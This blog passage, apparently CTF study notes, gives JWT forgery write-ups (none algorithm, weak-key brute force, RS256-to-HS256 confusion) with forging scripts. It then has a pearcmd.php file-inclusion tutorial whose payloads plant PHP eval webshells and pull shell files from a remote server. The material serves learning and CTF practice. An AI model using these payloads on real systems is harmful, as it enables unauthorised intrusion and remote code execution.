<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJBRyI6IjI1NGEwYzcyNzY2YWM4N30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJGTCI6ImN0Zmh1Yns2YTAwYTMxMzAifQ.uPFtXGkmPcxJiivPldw_Ek93HwLeem9VDO1vwJZO0HY</span><br></pre></td></tr></table></figure>

<p>拿去解码得到</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420162816882.png" alt="image-20240420162816882"></p>
<p>最终flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6a00a3130254a0c72766ac87&#125;</span><br></pre></td></tr></table></figure>



<h6 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h6><p>题目描述：</p>
<p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p>
<p>————</p>
<p>打开后还是登录，登录成功后可以看到<code>Hello 1(guest), only admin can get flag.</code>,应该就是要伪造admin，抓包看看，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.2Y5_56UX1H_28WxpkOq3eZ6AB-JeyLH-mXwimgwhew8</span><br></pre></td></tr></table></figure>

<p>拿去解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将role改为admin</p>
<p>结合题目描述直接使用脚本签名为none的jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure>

<p>再次<strong>在当前目录(index.php)发包</strong>，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420164328912.png" alt="image-20240420164328912"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;158cb73238f8b1378e1a6fe8&#125;</span><br></pre></td></tr></table></figure>

<h6 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h6><p>题目描述:<br>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p>
<p>————</p>
<p>第一次登录后显示<code>Hello 1(guest), only admin can get flag.</code></p>
<p>再次刷新获取资源，此时就会携带jwt向服务器发送请求，抓包获取得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.NHdRZ0DlkPjGsxP_ApUMag_hbFoqOZIbpwuNaa9PSYg</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用工具爆破</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165241660.png" alt="image-20240420165241660"></p>
<p>得到密钥为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eslu</span><br></pre></td></tr></table></figure>

<p>再在<a href="https://jwt.io/#encoded-jwt">jwt.io</a>伪造jwt即可</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165338094.png" alt="image-20240420165338094"></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.dAS6XdJSP08cxTDGETnLjsrCduMn12gimm5s0dhwFC8</span><br></pre></td></tr></table></figure>

<p>再次在获取资源页面发包</p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;2afa10ab9a76e138e01604a4&#125;</span><br></pre></td></tr></table></figure>



<h6 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h6><p>题目描述:<br>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p>
<p>————</p>
<p>打开题目给了源码，稍微审计一下源码，给了公钥地址，直接访问<code>/publickey.pem</code>，得到公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs2Zu6nNtgFv8Y3VRd4gm</span><br><span class="line">Wvqd+fkAvvBcve+1VIDpLCFSwBB9tz894Dt8c5RiU3bzSfCWFlhHYh7gWOP1Tvfc</span><br><span class="line">DNcmFkye4ce+ccnrrAE/nasF7OXoK2sZjgWdcjuT1n5MobKsD+DjJdlY0J4aZ+PS</span><br><span class="line">yjrK3UReEN5HEAnKG8H23eyKU5y8FOUjiF0s1YE7E1q4gZ14lCPCdyUfgNjje592</span><br><span class="line">lgOHhiRRxkPpg/jUYNtTNAJVsS1UBNw+06Dk5TharBklC4N9z47nkbSM90KDBe/K</span><br><span class="line">+nyPeqTqzvzCvY8WY/ml7lenkkvS38TkKI5Snu8H3a5ZNOCBdCYF1X8OFymtX85J</span><br><span class="line">zQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接登录，返回了一串字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.E5u_xfY9UrHQd1XBHKHKzgtw5kta7NhkbLmJnRXU_vQJphtf3BPonDwc1L3d8kZUG8JloGNQwVTy4xg6dgIZaCJPpl0m3tiizBEY9LOp33Avt7ZMGUXfo3P5z-VSr7uIVXm9b_z6R8OD5jy_Z3k_yoblzAxRSCoR5a8wGWVdKeIEQTFX7kfO4uOJ-zQinFvIK9ipki6_3-rXuyLOnx-CFAqaSKJ6wfPqSGTuKzatCs3HNcp4TI3f5M0_Qmn09kbzvlTMdQsVg5k45LceMGD38QdtaW4zOcIiPIuKp90rtYo3r12KMklJ0J11SZnsTdCPk6lsB925wK6H6sPy45Jr9Q </span><br></pre></td></tr></table></figure>

<p>应该是返回的jwt，拿去解密看看。得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将算法和role修改，直接使用脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span><br><span class="line">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span><br><span class="line">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span><br><span class="line">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span><br><span class="line">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span><br><span class="line">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span><br><span class="line">pwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">header = &#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))</span><br><span class="line">encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))</span><br><span class="line">encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + &quot;.&quot; + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line">print(token + &quot;.&quot; + sig)</span><br></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJyb290IiwgInJvbGUiOiAiYWRtaW4ifQ.ga1VAIojVGWB2b70fAN2OkBv0I6xCqBFtSj5KJvfiKk</span><br></pre></td></tr></table></figure>

<p>抓回包在获取资源的GET页面伪造token，再放包成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420175625851.png" alt="image-20240420175625851"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6ec9f26fdf733354f0c75c4c&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结:<strong>都是在获取资源页面（一般都是GET请求）伪造token来获取其他资源</strong>，需要注意。</strong></p>
<h5 id="polarctf"><a href="#polarctf" class="headerlink" title="polarctf"></a>polarctf</h5><h6 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h6><p>打开即是注册登录界面，如实操作后并没有flag，</p>
<p>然后在抓包界面看到如下jwt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8SGkFhdaEt0zvByKBtz1oO8ikAFCDHblv1iPowur7e0</span><br></pre></td></tr></table></figure>

<p>拿去网站解密一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>尝试爆破密钥</strong>，这里使用**<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>**工具爆破密钥，成功得到密钥为<code>SYSA</code>：<br><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240418205910130.png" alt="image-20240418205910130"></p>
<p>再通过jwt.io修改username为admin来伪造jwt</p>
<p>抓包修改username为admin，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240419194521275.png" alt="image-20240419194521275"></p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ec39c705cfb5295f9dddcedc819a1659&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结</strong>：还是要有敏感性，为什么刚好Jwt那里只有username，为而刚好对应不能将敏感信息写入jwt，这是就应该联想到flag在密码或者邮箱，继续学习。</p>
<p>其他参考：</p>
<p>2022祥云杯 - FunWEB</p>
<p>NewstarCTF 2023 - Ye’s Pickle</p>
]]></content>
      <categories>
        <category>jwt</category>
      </categories>
  </entry>
  <entry>
    <title>利用pearcmd.php进行文件包含</title>
    <url>/2024/04/28/pearcmd.php/</url>
    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
<span id="more"></span>

<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>有pear扩展（这样才能有pearcmd.php）</li>
<li>php开启了<code>register_argc_argv</code>选项</li>
<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
</ul>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
<p>看一看可以利用的参数：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
<ul>
<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
<ul>
<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
<p>构造出的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>

<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
<p><strong>对比一下即可：</strong></p>
<p>正常抓包后传参：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
<p>直接传参结果如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
<p>但是第二章图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
<p>使用的payload为(基本上不行，主要看下面那个)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>

<p>同样还是抓包传payload（方便），页面回显</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
<p><strong>另外的payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>

<p>抓包放包后页面如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
<p>这里给出了路径，然后去包含这个路径即可</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>

<p>这个是直接下载到当前页面。</p>
<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>

<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
<p>其他的利用方式，个人感觉挺好的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>

<p>看看选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>

<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>





<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
